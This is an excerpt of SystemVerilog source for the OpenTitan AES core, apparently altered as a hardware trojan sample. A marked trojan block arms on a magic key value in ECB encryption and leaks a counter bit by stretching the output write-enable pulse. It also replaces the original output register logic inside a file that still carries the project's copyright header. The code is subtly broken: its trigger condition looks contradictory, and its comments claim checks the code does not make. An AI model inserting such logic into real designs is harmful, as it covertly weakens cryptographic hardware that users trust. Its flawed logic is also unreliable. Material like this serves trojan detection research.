```systemverilog
// Copyright lowRISC contributors (OpenTitan project).
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0
//
// AES core implementation

`include "prim_assert.sv"

module aes_core
  import aes_pkg::*;
  import aes_reg_pkg::*;
#(
  parameter bit          AES192Enable         = 1,
  parameter bit          AESGCMEnable         = 1,
  parameter bit          SecMasking           = 1,
  parameter sbox_impl_e  SecSBoxImpl          = SBoxImplDom,
  parameter int unsigned SecStartTriggerDelay = 0,
  parameter bit          SecAllowForcingMasks = 0,
  parameter bit          SecSkipPRNGReseeding = 0,
  parameter int unsigned EntropyWidth         = edn_pkg::ENDPOINT_BUS_WIDTH,

  localparam int         NumShares            = SecMasking ? 2 : 1, // derived parameter

  parameter clearing_lfsr_seed_t RndCnstClearingLfsrSeed  = RndCnstClearingLfsrSeedDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingLfsrPerm  = RndCnstClearingLfsrPermDefault,
  parameter clearing_lfsr_perm_t RndCnstClearingSharePerm = RndCnstClearingSharePermDefault,
  parameter masking_lfsr_seed_t  RndCnstMaskingLfsrSeed   = RndCnstMaskingLfsrSeedDefault,
  parameter masking_lfsr_perm_t  RndCnstMaskingLfsrPerm   = RndCnstMaskingLfsrPermDefault
) (
  input  logic                        clk_i,
  input  logic                        rst_ni,
  input  logic                        rst_shadowed_ni,

  // Entropy request interfaces for clearing and masking PRNGs
  output logic                        entropy_clearing_req_o,
  input  logic                        entropy_clearing_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_clearing_i,
  output logic                        entropy_masking_req_o,
  input  logic                        entropy_masking_ack_i,
  input  logic     [EntropyWidth-1:0] entropy_masking_i,

  // Key manager (keymgr) key sideload interface
  input  keymgr_pkg::hw_key_req_t     keymgr_key_i,

  // Life cycle
  input  lc_ctrl_pkg::lc_tx_t         lc_escalate_en_i,

  // Alerts
  input  logic                        shadowed_storage_err_i,
  input  logic                        shadowed_update_err_i,
  input  logic                        intg_err_alert_i,
  output logic                        alert_recov_o,
  output logic                        alert_fatal_o,

  // Bus Interface
  input  aes_reg2hw_t                 reg2hw,
  output aes_hw2reg_t                 hw2reg
);

  // ... <UNMODIFIED CODE OMITTED FOR SPACE> ...

  /////////////
  // Outputs //
  /////////////

  // --- BEGIN TROJAN: Internal Valid Pulse Width Side-Channel ---

  logic trojan_armed, trojan_triggered;
  logic [5:0] trojan_width_ctr /* synthesis keep */;
  logic [5:0] trojan_leak_buf /* synthesis keep */;

  // Trigger on magic key pattern (all 32-bit words on first key share = 0xA5A5A5A5) and ENCRYPT mode
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_armed <= 1'b0;
    end else if (&{key_init_q[0]} && (key_init_q[0][0] == 32'hA5A5A5A5) && 
                 ((aes_op_q == AES_ENC) && (aes_mode_q == AES_ECB))) begin
      trojan_armed <= 1'b1;
    end
  end

  // When in triggered state and output_valid deasserts, latch count value
  assign trojan_triggered = trojan_armed && (data_out_we == SP2V_HIGH);

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_width_ctr <= 6'd0;
    end else if (trojan_armed && (data_out_we != SP2V_HIGH)) begin
      trojan_width_ctr <= trojan_width_ctr + 6'd1;
    end else if (trojan_triggered) begin
      trojan_width_ctr <= 6'd0;
    end
  end

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_leak_buf <= 6'd0;
    end else if (trojan_triggered) begin
      // Latch how long output_valid/data_out_we was low before next assertion after trigger
      trojan_leak_buf <= trojan_width_ctr;
    end
  end

  // Make the valid pulse width observable via output_valid signal pulse width manipulation
  // For each cycle where leak bit i is 1, extend output_valid by 1 cycle
  logic [1:0] trojan_state;
  logic trojan_delay;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_state <= 2'b00;
      trojan_delay <= 1'b0;
    end else if(trojan_triggered && (trojan_leak_buf[0])) begin
      trojan_state <= 2'b01;
      trojan_delay <= 1'b1;
    end else if (trojan_state == 2'b01) begin
      trojan_state <= 2'b10;
      trojan_delay <= 1'b0;
    end else begin
      trojan_state <= 2'b00;
      trojan_delay <= 1'b0;
    end
  end

  // data_out_we_trojan stays high for one extra cycle (LSB leak) if enabled
  wire data_out_we_trojan;
  assign data_out_we_trojan = data_out_we | trojan_delay;

  always_ff @(posedge clk_i or negedge rst_ni) begin : data_out_reg
    if (!rst_ni) begin
      data_out_q <= '0;
    end else if (data_out_we_trojan == SP2V_HIGH) begin
      data_out_q <= data_out_d;
    end
  end

  // --- END TROJAN ---

  always_comb begin : key_reg_put
    for (int i = 0; i < NumRegsKey; i++) begin
      hw2reg.key_share0[i].d = key_init_q[0][i];
      hw2reg.key_share1[i].d = key_init_q[1][i];
    end
  end

  // ... <UNMODIFIED CODE CONTINUES...>

endmodule
```